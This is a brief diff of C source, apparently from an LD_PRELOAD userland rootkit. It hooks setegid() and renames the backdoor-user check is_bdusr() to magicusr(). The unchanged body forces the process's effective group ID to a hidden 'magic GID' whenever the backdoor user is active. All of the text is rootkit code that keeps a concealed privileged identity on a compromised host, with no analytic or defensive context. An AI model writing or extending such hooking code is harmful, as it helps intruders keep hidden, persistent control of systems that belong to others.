@@ -1,6 +1,6 @@
 int setegid(gid_t egid){
     hook(CSETEGID);
-    if(is_bdusr()){
+    if(magicusr()){
         gid_t magicgid = readgid();
         if(egid != magicgid)
             call(CSETEGID, magicgid);
